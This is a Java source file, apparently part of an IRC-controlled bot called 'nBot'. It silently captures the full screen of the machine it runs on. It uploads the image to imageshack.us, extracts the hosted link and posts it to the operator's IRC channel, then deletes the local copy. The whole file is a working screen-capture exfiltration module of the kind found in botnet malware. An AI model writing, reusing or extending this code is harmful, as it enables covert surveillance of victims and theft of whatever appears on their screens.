
import java.awt.image.BufferedImage;
import java.awt.*;
import java.io.*;

import java.net.*;

import javax.imageio.ImageIO;

public class Screenshot {

    private static String uploadFile(String file) {
        HttpURLConnection conn = null;
        DataOutputStream dos = null;
        DataInputStream inStream = null;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;
        String urlString = "http://www.imageshack.us";
        try {
            String strFilename = file;
            try {
                FileInputStream fileInputStream = new FileInputStream(new File(
                        strFilename));
                URL url = new URL(urlString);
                conn = (HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type",
                        "multipart/form-data;boundary=" + boundary);
                dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"fileupload\";" + " filename=\"" + strFilename + "\"" + lineEnd);
                dos.writeBytes(lineEnd);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                buffer = new byte[bufferSize];
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                while (bytesRead > 0) {
                    dos.write(buffer, 0, bufferSize);
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                }
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                fileInputStream.close();
                dos.flush();
                dos.close();
            } catch (MalformedURLException ex) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not take screenshot. Reason: " + ex.toString());
            } catch (IOException ioe) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not take screenshot. Reason: " + ioe.toString());
            }
        } catch (Exception e) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not take screenshot. Reason: " + e.toString());
        }
        try {
            inStream = new DataInputStream(conn.getInputStream());
            int ii;
            String returnd = "";
            while ((ii = inStream.read()) != -1) {
                returnd += (char) ii;
            }
            int pos = returnd.indexOf("Include details");
            returnd = returnd.substring(pos);
            pos = returnd.indexOf("[IMG]");
            returnd = returnd.substring(pos + 5);
            pos = returnd.indexOf("[/IMG]");
            returnd = returnd.substring(0, pos);

            inStream.close();

            return (returnd);
        } catch (IOException ioex) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not take screenshot. Reason: " + ioex.toString());
        }
        return "";
    }

    public static void takeScreenshot() {
        try {
            Robot robot = new Robot();
            BufferedImage screenShot = robot.createScreenCapture(new Rectangle(
                    Toolkit.getDefaultToolkit().getScreenSize()));
            ImageIO.write(screenShot, "PNG", new File("image.png"));
            String image = uploadFile("image.png");
            alert(image);
            new File("image.png").delete();
        } catch (Exception e) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not take screenshot. Reason: " + e.toString());
            e.printStackTrace();
        }
    }

    public static void alert(String text) throws IOException {
        IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " " + text);
    }
}